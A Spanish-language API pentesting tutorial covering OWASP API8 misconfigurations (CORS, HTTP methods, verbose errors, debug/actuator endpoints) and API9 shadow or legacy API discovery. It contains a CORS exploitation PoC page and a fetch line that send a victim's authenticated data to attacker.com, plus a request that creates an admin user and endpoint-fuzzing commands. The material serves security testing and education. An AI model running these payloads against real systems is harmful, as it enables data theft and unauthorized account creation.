# API8 & API9 — Security Misconfiguration y Shadow APIs

### API8 — Security Misconfiguration

Las configuraciones de seguridad incorrectas en APIs son muy variadas. Las más frecuentes:

```
→ CORS demasiado permisivo
→ Métodos HTTP innecesarios habilitados (DELETE, PUT en endpoints que no lo necesitan)
→ Mensajes de error demasiado detallados (stack traces, queries SQL en producción)
→ Cabeceras de seguridad ausentes
→ TLS deshabilitado o con versión antigua
→ Endpoints de debug/admin accesibles en producción
→ Documentación Swagger expuesta en producción
→ Variables de entorno / configuración expuestas
```

#### CORS Misconfiguration en APIs

CORS (Cross-Origin Resource Sharing) controla qué dominios pueden hacer peticiones a la API desde un navegador. Una mala configuración permite que cualquier dominio lea las respuestas.

**Tipos de misconfiguration**

```bash
# 1. Origin reflejado sin validación (el más peligroso)
# El servidor devuelve el Origin del atacante en Access-Control-Allow-Origin

Request:
GET /api/users/me HTTP/1.1
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com   ← refleja el origen
Access-Control-Allow-Credentials: true               ← con credenciales

# Exploit: leer la respuesta desde attacker.com con las cookies/token del usuario
fetch('https://target.com/api/users/me', {credentials: 'include'})
    .then(r => r.json())
    .then(data => fetch('https://attacker.com/steal?d=' + JSON.stringify(data)));

# 2. Wildcard con credenciales
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Nota: el estándar no permite esto (wildcard + credentials)
# Pero algunos servidores mal configurados lo devuelven igual

# 3. Subdominio de confianza comprometible
Access-Control-Allow-Origin: https://cdn.target.com
# Si cdn.target.com tiene XSS o subdomain takeover → bypass

# 4. Null origin aceptado
Access-Control-Allow-Origin: null
# Cualquier iframe sandboxed o file:// puede hacer peticiones
```

**Detectar CORS inseguro**

```bash
# Probar distintos orígenes y ver cuál se refleja
curl -H "Origin: https://attacker.com" -I https://target.com/api/users/me
curl -H "Origin: null" -I https://target.com/api/users/me
curl -H "Origin: https://target.com.attacker.com" -I https://target.com/api/users/me
curl -H "Origin: https://attacker.target.com" -I https://target.com/api/users/me
curl -H "Origin: https://notarget.com" -I https://target.com/api/users/me

# Con Burp Scanner (Pro)
# Active Scan → busca automáticamente CORS inseguro

# Script de detección
origins=(
    "https://attacker.com"
    "https://target.com.attacker.com"
    "https://attacker.target.com"
    "null"
    "http://target.com"
    "https://sub.target.com"
)

for origin in "${origins[@]}"; do
    response=$(curl -s -I -H "Origin: $origin" https://target.com/api/users/me)
    acao=$(echo "$response" | grep -i "access-control-allow-origin")
    acac=$(echo "$response" | grep -i "access-control-allow-credentials")
    if [ -n "$acao" ]; then
        echo "[!] Origin: $origin → $acao $acac"
    fi
done
```

**PoC de explotación CORS**

```html
<!-- Página en attacker.com que roba datos via CORS misconfiguration -->
<!DOCTYPE html>
<html>
<body>
<script>
// El usuario víctima visita esta página mientras tiene sesión en target.com
fetch('https://target.com/api/users/me', {
    credentials: 'include'  // envía las cookies de target.com
})
.then(response => response.json())
.then(data => {
    // Exfiltrar datos al servidor del atacante
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
    document.body.innerHTML = JSON.stringify(data);
});
</script>
</body>
</html>
```

#### Métodos HTTP innecesarios

```bash
# Verificar qué métodos acepta la API
curl -X OPTIONS https://target.com/api/users -I
# Respuesta: Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD

# Probar métodos que no deberían estar disponibles
# TRACE — puede revelar cabeceras internas (XST attack)
curl -X TRACE https://target.com/api/users

# DELETE en recursos que no deberían borrarse
curl -X DELETE https://target.com/api/users/1042 -H "Authorization: Bearer TOKEN"

# PUT para crear recursos arbitrarios
curl -X PUT https://target.com/api/users/9999 \
    -H "Content-Type: application/json" \
    -d '{"id":9999,"email":"created@evil.com","role":"admin"}'
```

#### Verbose errors (Stack traces en producción)

```bash
# Provocar errores intencionados para ver si revelan información interna
curl https://target.com/api/users/INVALID_FORMAT
curl https://target.com/api/users/99999999999999
curl -X POST https://target.com/api/users -d 'invalid json{'
curl https://target.com/api/users?id[]=1  # Array injection

# Respuesta vulnerable:
{
    "error": "Internal Server Error",
    "message": "Column 'user_id' cannot be null",
    "stack": "at /app/src/controllers/UserController.js:45:12\n at ...",
    "query": "SELECT * FROM users WHERE id = 'INVALID_FORMAT'"
}

# Información revelada:
# → Nombres de columnas de la base de datos
# → Rutas del sistema de archivos del servidor
# → Versión del framework y librerías
# → Queries SQL internas
# → IPs internas en los stack traces
```

#### Endpoints de debug/admin en producción

```bash
# Endpoints de diagnóstico que no deberían estar en producción
/api/debug
/api/debug/users
/api/debug/config
/api/health (a veces revela demasiado)
/api/info
/api/status
/api/version
/api/test
/api/dev
/api/internal

# Spring Boot Actuator (muy común en APIs Java)
/actuator
/actuator/env        ← variables de entorno con contraseñas en claro
/actuator/beans      ← beans de Spring
/actuator/mappings   ← todos los endpoints
/actuator/dump       ← heap dump
/actuator/health
/actuator/info
/actuator/metrics

# Django Debug Toolbar / Django Admin
/api/__debug__/
/admin/

# Laravel Telescope
/telescope
/telescope/api/requests
```

### API9 — Improper Inventory Management

#### ¿Qué es?

La organización no tiene un inventario actualizado de todas sus APIs. Como resultado:

```
→ Versiones antiguas de la API siguen activas (/api/v1/ aunque esté /api/v3/)
→ Las versiones antiguas tienen menos controles de seguridad
→ APIs de testing/staging accesibles desde producción
→ APIs de terceros integradas sin auditar
→ Endpoints no documentados ("shadow APIs")
→ APIs de microservicios internas expuestas por error al exterior
```

#### Descubrir versiones antiguas de la API

```bash
# Probar versiones numéricas
/api/v1/
/api/v2/
/api/v3/
/api/v0/       ← proto-versión, sin controles
/api/beta/
/api/alpha/
/api/legacy/
/api/old/
/api/2019/     ← versiones por año
/api/2020/
/api/2021/

# Con subdominios
https://api-v1.target.com/
https://api-legacy.target.com/
https://api-beta.target.com/
https://staging-api.target.com/
https://dev-api.target.com/

# En cabeceras de versión
GET /api/users HTTP/1.1
API-Version: 1
X-API-Version: 1
Accept: application/vnd.target.v1+json
```

**Por qué las versiones antiguas son más vulnerables**

```
/api/v3/users/{id}     → tiene autenticación JWT + autorización por objeto
/api/v1/users/{id}     → autenticación básica sin BOLA check

/api/v3/admin/users    → solo admins, verifica rol en el token
/api/v1/admin/users    → sin control de roles (se añadió después)

Casos reales frecuentes:
→ v1 no tiene rate limiting (se añadió en v2)
→ v1 devuelve la contraseña en claro (se hasheó en v2)
→ v1 no verifica el token de sesión en algunos endpoints (se parchó en v2)
```

#### Descubrir shadow APIs

```bash
# Shadow APIs: endpoints que existen pero no están documentados
# Se descubren por:
# 1. Análisis del JS de la app
grep -E "(fetch|axios|http)\s*\(['\"]" app.js
grep -E "/api/[a-z_-]+" app.js | sort -u

# 2. Mobile app decompilation
# Descompilar APK con jadx o apktool
jadx -d output/ app.apk
grep -r "api\." output/sources/

# 3. Wayback Machine / Archive
gau target.com | grep "/api/" | sort -u
waybackurls target.com | grep "/api/"

# 4. Wordlists específicas de APIs
ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
    -mc 200,201,401,403 \
    -o api_endpoints.json

# 5. Kiterunner con múltiples wordlists
kr scan https://target.com -w routes-large.kite
kr scan https://target.com -w /path/to/swagger_wordlist.txt

# 6. Buscar en documentación pública / Postman collections
# Muchas empresas tienen colecciones de Postman públicas en:
# https://www.postman.com/search/collections?q=target.com
```

#### Entornos de testing expuestos en producción

```bash
# Subdominios de staging/dev que usan datos de producción
https://staging.target.com/api/
https://dev.target.com/api/
https://test.target.com/api/
https://qa.target.com/api/
https://sandbox.target.com/api/
https://uat.target.com/api/

# Estos entornos suelen tener:
# → Credenciales de producción en las variables de entorno
# → Menor seguridad (sin WAF, sin rate limiting)
# → Misma base de datos que producción (o copia reciente)
# → Swagger/debug expuesto que no está en producción
```

#### Inconsistencias entre versiones

```bash
# Si en v2 hay BOLA check pero en v1 no:
GET /api/v2/users/1043 → 403 Forbidden
GET /api/v1/users/1043 → 200 OK {datos de 1043}  ← bypass

# Si en v2 hay auth pero en v1 no:
GET /api/v2/admin/users → 401 Unauthorized
GET /api/v1/admin/users → 200 OK {lista de usuarios}

# Si en v2 hay rate limiting pero en v1 no:
POST /api/v2/auth/login (100 veces) → 429 Too Many Requests
POST /api/v1/auth/login (100 veces) → 200/401 cada vez (sin límite)

# Probar la misma acción en todas las versiones encontradas
for version in v0 v1 v2 v3 beta legacy old; do
    echo "=== /api/$version ==="
    curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/api/$version/users/1043" \
        -H "Authorization: Bearer TOKEN_USUARIO_A"
    echo ""
done
```

### Checklist API8 & API9

```
CORS (API8):
□ Probar Origin: https://attacker.com → ¿se refleja?
□ Probar Origin: null → ¿aceptado?
□ Verificar si Access-Control-Allow-Credentials: true con origen reflejado
□ Comprobar que los dominios en la whitelist no tienen XSS

Métodos HTTP (API8):
□ Enviar OPTIONS a endpoints clave → ver qué métodos están habilitados
□ Probar TRACE en el API server
□ Probar DELETE/PUT en recursos no esperados

Errores verbose (API8):
□ Provocar errores con inputs inválidos → ¿hay stack traces?
□ ¿Se revelan nombres de columnas, tablas, rutas del sistema?

Endpoints de debug (API8):
□ Probar /actuator, /actuator/env en APIs Java/Spring
□ Probar /api/debug, /api/info, /api/test
□ Verificar si Swagger está expuesto en producción

Shadow APIs y versiones (API9):
□ Probar /api/v1/, /api/v0/, /api/beta/, /api/legacy/
□ Descubrir endpoints en el JS con grep
□ Buscar colecciones de Postman públicas en postman.com
□ Probar staging/dev subdomains con datos de producción
□ Si v2 tiene controles, verificar si v1 también los tiene
```

> Los endpoints `/actuator/env` en APIs Spring Boot son hallazgos críticos: exponen contraseñas de base de datos, API keys y secretos de aplicación en texto plano. Buscarlos siempre en cualquier API Java.

> Buscar colecciones de Postman públicas con `site:postman.com "target.com"` en Google frecuentemente revela endpoints no documentados, tokens de ejemplo hardcodeados, y la estructura completa de la API sin necesidad de fuzzing.

> ⚠CORS con `Access-Control-Allow-Origin: *` sin `Access-Control-Allow-Credentials: true` es inofensivo para APIs autenticadas con cookies. El problema real es el CORS reflejado + credenciales, que permite a cualquier web leer respuestas autenticadas de la API.
